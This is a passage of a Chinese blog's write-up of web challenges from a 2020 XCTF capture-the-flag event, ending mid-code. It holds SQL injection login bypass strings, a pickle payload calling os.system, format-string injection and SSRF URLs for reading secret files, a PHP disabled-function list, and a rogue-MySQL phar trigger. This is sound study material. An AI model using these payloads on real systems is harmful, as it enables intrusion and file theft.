<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="XCTF高校战“疫”网络安全分享赛"/>




  <meta name="keywords" content="wp," />





  <link rel="alternate" href="/default" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2020/03/08/高校战“疫”网络安全分享赛/"/>


<meta property="og:type" content="article">
<meta property="og:title" content="XCTF高校战“疫”网络安全分享赛">
<meta property="og:url" content="https://glotozz.github.io/2020/03/08/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/03/07/7Sxh53K89qCXN4m.png">
<meta property="og:image" content="https://i.loli.net/2020/03/07/6hZtDM5xiCeGO47.png">
<meta property="og:image" content="https://i.loli.net/2020/03/07/Mpq1VOLXboZ9QN2.png">
<meta property="og:image" content="https://i.loli.net/2020/03/08/5m7hf1Z6UuFWRVY.png">
<meta property="og:image" content="https://i.loli.net/2020/03/08/iLk8vfHJAeDnIyw.png">
<meta property="article:published_time" content="2020-03-08T12:02:35.000Z">
<meta property="article:modified_time" content="2020-03-11T06:46:46.506Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/03/07/7Sxh53K89qCXN4m.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  


<audio src="../../075d_045e_0e5a_076f2c3da03467077eca904ce3e6272e.mp3" autoplay="autoplay"></audio>
    <title> XCTF高校战“疫”网络安全分享赛 - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"></head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          XCTF高校战“疫”网络安全分享赛
        
      </h1>

      <time class="post-time">
          Mar 08 2020
      </time>
    </header>



    
            <div class="post-content">
            <meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
<!-- toc -->

<ul>
<li><a href="#sqlcheckin">sqlcheckin</a></li>
<li><a href="#webtmp">webtmp</a></li>
<li><a href="#fmkq">fmkq</a></li>
<li><a href="#nweb">nweb</a></li>
<li><a href="#uaf-php">UAF-PHP</a></li>
<li><a href="#webct">webct</a></li>
<li><a href="#easy_trick_gzmtu">easy_trick_gzmtu</a></li>
<li><a href="#hackme">hackme</a></li>
<li><a href="#guessgame">GuessGame</a></li>
<li><a href="#nothardweb">NothardWeb</a></li>
<li><a href="#dooog">dooog</a></li>
<li><a href="#baby_java">baby_java</a></li>
<li><a href="#happyvacation">happyvacation</a></li>
<li><a href="#hardphp">hardphp</a></li>
<li><a href="#easyweb">easyweb</a></li>
<li><a href="#总结">总结：</a></li>
<li><a href="#参考链接">参考链接：</a></li>
</ul>
<!-- tocstop -->

<hr>
<h4><span id="sqlcheckin">sqlcheckin</span></h4><p>代码没有进行转义，过滤了很多，下面的万能密码可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">&#39;-0-&#39;</span><br><span class="line">1&#39;-&#39;1</span><br><span class="line">&#39;&amp;&#39;1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>除了开头是非零数的字符串，其他字符串化成整数都为0，字符串=0为真，当所有username里没有开头是0的字符串，username=0相当于查全部数据</p>
</blockquote>
<p><img src="https://i.loli.net/2020/03/07/7Sxh53K89qCXN4m.png" alt="Snipaste_2020-03-07_16-29-22.png"></p>
<hr>
<h4><span id="webtmp">webtmp</span></h4><p>过滤了<code>R</code></p>
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="noopener">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势</a></p>
</blockquote>
<p>一开始考虑RCE</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#39;\x80\x03c__main__\nAnimal\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls &#x2F;\nb0c__main__\nAnimal\n)\x81&#125;(X\x04\x00\x00\x00nameq\x03X\x14\x00\x00\x00\xe4\xb8\x80\xe7\xbb\x99\xe6\x88\x91\xe5\x93\xa9giaogiaoq\x04X\x08\x00\x00\x00categoryq\x05X\x04\x00\x00\x00Giaoq\x06ub.&#39;</span><br></pre></td></tr></table></figure>

<p>提示global XX，应该是因为<code>raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))</code>，后来考虑改写secret对象</p>
<img src="https://i.loli.net/2020/03/07/6hZtDM5xiCeGO47.png" alt="Snipaste_2020-03-07_16-57-23.png" style="zoom:67%;">

<p><code>secret.py</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret &#x3D; &#123;&#39;name&#39;:&#39;xx&#39;,&#39;category&#39;:&#39;yy&#39;&#125;</span><br></pre></td></tr></table></figure>

<p><code>exp.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.name = <span class="string">'aa'</span></span><br><span class="line">        self.category = <span class="string">'bb'</span></span><br><span class="line">s = <span class="string">b'\x80\x03c__main__\nsecret\n&#125;(Vname\nVaa\nVcategory\nVbb\nub0c__main__\nAnimal\n)\x81&#125;(X\x04\x00\x00\x00nameX\x02\x00\x00\x00aaX\x08\x00\x00\x00categoryX\x02\x00\x00\x00bbub.'</span></span><br><span class="line">l = pickle.loads(s)</span><br><span class="line">pickletools.dis(s)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/07/Mpq1VOLXboZ9QN2.png" alt="image.png"></p>
<p>base64编码即可</p>
<hr>
<h4><span id="fmkq">fmkq</span></h4><p>绕过head：  <code>\</code></p>
<p>绕过format：  <code>%1$s</code></p>
<p>8080端口api，考虑ssrf</p>
<p>尝试了各种payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:8080&#x2F;read&#x2F;file&#x3D;&#x2F;tmp&#x2F;..&#x2F;*&#x2F;flag%26vipcode&#x3D;0</span><br></pre></td></tr></table></figure>

<p>最后队里一个师傅搞到了vipcode</p>
<p><code>{file.vip.__dict__}</code></p>
<p>之后虽然找到了flag路径，但是提示nonono，需要读取源码</p>
<p><code>/app/app.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> web</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">from</span> base.readfile <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">'/'</span>, <span class="string">'help'</span>,</span><br><span class="line">    <span class="string">'/read/(.*)'</span>,<span class="string">'read'</span></span><br><span class="line">)</span><br><span class="line">web.config.debug = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">help</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        help_information = <span class="string">'''</span></span><br><span class="line"><span class="string">        Welcome to our FMKQ api, you could use the help information below</span></span><br><span class="line"><span class="string">        To read file:</span></span><br><span class="line"><span class="string">            /read/file=example&amp;vipcode=example</span></span><br><span class="line"><span class="string">            if you are not vip,let vipcode=0,and you can only read /tmp/&#123;file&#125;</span></span><br><span class="line"><span class="string">        Other functions only for the vip!!!</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">return</span> help_information</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">read</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(self,text)</span>:</span></span><br><span class="line">        file2read = readfile(text)</span><br><span class="line">        <span class="keyword">if</span> file2read.test() == <span class="literal">False</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> file2read.isvip() == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">"The content of "</span>+ file2read.GetFileName() +<span class="string">" is &#123;file&#125;"</span>).format(file=file2read)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                vipfile2read = vipreadfile(file2read)</span><br><span class="line">                <span class="keyword">return</span> (str(vipfile2read))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = web.application(urls, globals())</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p><code>/app/base/vip.py</code>就是验证码的</p>
<p><code>/app/base/readfile.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .vip <span class="keyword">import</span> vip</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,file)</span>:</span></span><br><span class="line">        self.file = file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">readfile</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        filename = self.GetFileName()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'..'</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">'proc'</span> <span class="keyword">in</span> filename:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"quanbumuda"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                file = open(<span class="string">"/tmp/"</span> + filename, <span class="string">'r'</span>)</span><br><span class="line">                content = file.read()</span><br><span class="line">                file.close()</span><br><span class="line">                <span class="keyword">return</span> content</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"error"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">r'file=.*?&amp;vipcode=.*?'</span>,data) != <span class="literal">None</span>:</span><br><span class="line">            data = data.split(<span class="string">'&amp;'</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>],</span><br><span class="line">                data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.file = File(data[<span class="string">'file'</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'vipcode'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.vipcode = data[<span class="string">'vipcode'</span>]</span><br><span class="line">            self.vip = vip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vipcode'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vip'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isvip</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.vipcode == self.vip.GetCode():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetFileName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file.GetName()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_folder_file = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vipreadfile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,readfile)</span>:</span></span><br><span class="line">        self.filename = readfile.GetFileName()</span><br><span class="line">        self.path = os.path.dirname(os.path.abspath(self.filename))</span><br><span class="line">        self.file = File(os.path.basename(os.path.abspath(self.filename)))</span><br><span class="line">        <span class="keyword">global</span> current_folder_file</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            current_folder_file = os.listdir(self.path)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            current_folder_file = current_folder_file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fl4g'</span> <span class="keyword">in</span> self.path:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'nonono,this folder is a secret!!!'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = <span class="string">'''Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n'''</span></span><br><span class="line">            filepath = (self.path + <span class="string">'/&#123;vipfile&#125;'</span>).format(vipfile=self.file)</span><br><span class="line">            output += filepath</span><br><span class="line">            output += <span class="string">'\r\n\r\nThe content is:\r\n'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f = open(filepath,<span class="string">'r'</span>)</span><br><span class="line">                content = f.read()</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                content = <span class="string">'can\'t read'</span></span><br><span class="line">            output += content</span><br><span class="line">            output += <span class="string">'\r\n\r\nOther files under the same folder:\r\n'</span></span><br><span class="line">            output += <span class="string">' '</span>.join(current_folder_file)</span><br><span class="line">            <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>

<p>需要绕过黑名单</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if &#39;fl4g&#39; in self.path:</span><br><span class="line">	return &#39;nonono,this folder is a secret!!!&#39;</span><br></pre></td></tr></table></figure>

<p>我们传入的是<code>readfile</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetName</span><span class="params">(self)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> self.file</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFileName</span><span class="params">(self)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> self.file.GetName()</span><br><span class="line"></span><br><span class="line">self.filename = readfile.GetFileName()</span><br><span class="line">self.path = os.path.dirname(os.path.abspath(self.filename))</span><br><span class="line">filepath = (self.path + <span class="string">'/&#123;vipfile&#125;'</span>).format(vipfile=self.file)</span><br></pre></td></tr></table></figure>

<p>分析下汪汪汪师傅的payload</p>
<p><code>http://127.0.0.1:8080/read/file=/{vipfile.file[0]}l4g_1s_h3re_u_wi11_rua/flag</code></p>
<p>本地搭建下</p>
<p><img src="https://i.loli.net/2020/03/08/5m7hf1Z6UuFWRVY.png" alt="Snipaste_2020-03-08_14-16-09.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filepath &#x3D; (&#39;C:\\&#123;vipfile.file[0]&#125;l4g_1s_h3re_u_wi11_rua&#x2F;&#123;vipfile&#125;&#39;).format(vipfile&#x3D;self.file)</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">filepath &#x3D; (&#39;C:\\fl4g_1s_h3re_u_wi11_rua&#39; + &#39;&#x2F;flag&#39;)</span><br></pre></td></tr></table></figure>

<p><code>format()</code>是可以传入对象的，这里传入的<code>self.file</code>是file对象，<code>file.file</code>是<code>{str}&#39;flag&#39;</code>，因此<code>vipfile.file[0]</code>就是<code>f</code>，至于<code>{vipfile}</code>，就是<code>def __str__(self):</code>返回的字符串</p>
<p>最后举个简单的例子</p>
<p><img src="https://i.loli.net/2020/03/08/iLk8vfHJAeDnIyw.png" alt="Snipaste_2020-03-08_15-19-21.png"></p>
<p>==================分割线</p>
<p>补充下前面ssti的探测过程，当时不知道为啥没测出来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;file.__class__&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;file.__class__.__init__.__globals__&#125;</span><br></pre></td></tr></table></figure>

<p>发现<code>file</code>下有个<code>vip</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;file.vip.class.init.globals&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4><span id="nweb">nweb</span></h4><p>根据html提示<code>110</code>，修改type，成功注册</p>
<p>之后是sql注入，报500，猜测是替换为空，双写绕过，得到一半flag</p>
<p>提示<code>Rogue-MySql-Server</code>，给了账号密码，登录admin发现可以mysql恶意服务端读取</p>
<hr>
<h4><span id="uaf-php">UAF-PHP</span></h4><p>PHP7.4，但是未开启FFI</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apache_child_terminate,apache_setenv,chgrp,chmod,chown,curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,pcntl_alarm,pcntl_exec,pcntl_fork,pcntl_setpriority,pcntl_signal,pcntl_signal_dispatch,pcntl_sigprocmask,pcntl_sigtimedwait,pcntl_sigwaitinfo,pcntl_wait,pcntl_waitpid,pcntl_wstopsig,pcntl_wtermsig,popen,posix_kill,proc_get_status,proc_open,proc_terminate,putenv,readlink,shell_exec,symlink,syslog,system</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir	&#x2F;var&#x2F;www&#x2F;html:&#x2F;tmp</span><br></pre></td></tr></table></figure>

<p>用这个php7.0-7.4的exp</p>
<blockquote>
<p><a href="https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php?tdsourcetag=s_pctim_aiomsg</a> </p>
</blockquote>
<p>沙箱有点问题，最后放tmp目录下再包含才成功</p>
<hr>
<h4><span id="webct">webct</span></h4><p>上传<code>phar.gif</code>，利用mysql服务端恶意读取文件触发<code>phar://</code></p>
<p>记录一个小坑，PHP的配置一般是常量，因此可以打印下从而解决直接传<code>MYSQLI_OPT_LOCAL_INFILE</code>传输后变字符串的问题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $m = <span class="keyword">new</span> mysqli(<span class="string">'117.78.1.xxx'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">    <span class="keyword">if</span>($m-&gt;connect_error)&#123;</span><br><span class="line">        <span class="keyword">die</span>($m-&gt;connect_error);</span><br><span class="line">    &#125;</span><br><span class="line">    var_dump(MYSQLI_OPT_LOCAL_INFILE);</span><br><span class="line">    $m-&gt;options(MYSQLI_OPT_LOCAL_INFILE,<span class="number">1</span>);</span><br><span class="line">    $result=$m-&gt;query(<span class="string">'select 1;'</span>);</span><br></pre></td></tr></table></figure>

<p>option传8即可</p>
<h4><span id="easy_trick_gzmtu">easy_trick_gzmtu</span></h4><p>每个字母前添加<code>\</code>即可，成功得到</p>
<p><code>url： /eGlhb2xldW5n        username： admin    password： 20200202goodluck</code></p>
<p>登录后存在文件读取，绕过本地</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;file:&#x2F;&#x2F;localhost&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</span><br></pre></td></tr></table></figure>

<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'conn.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$time = date($_GET[<span class="string">'time'</span>]);</span><br><span class="line">$sql = <span class="string">"select * from `content` where `createtime` = '$time' "</span>;</span><br><span class="line">$r = $conn-&gt;query($sql);</span><br><span class="line">$content = $r-&gt;fetch_array(MYSQL_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p> <a href="https://www.php.net/manual/zh/function.date.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.date.php</a> </p>
<p> 在格式字串中的字符前加上反斜线来转义可以避免它被按照上表解释。 </p>
</blockquote>
<p><code>eGlhb2xldW5n/check.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../conn.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_SESSION[<span class="string">'login'</span>]))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'请登录!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">$parts = parse_url($url);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $parts[<span class="string">'host'</span>] != <span class="string">'localhost'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'请从本地访问'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!preg_match(<span class="string">"/flag|fl|la|ag|fla|lag|log/is"</span>, $parts[<span class="string">'path'</span>]))&#123;</span><br><span class="line">		readfile($url);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span 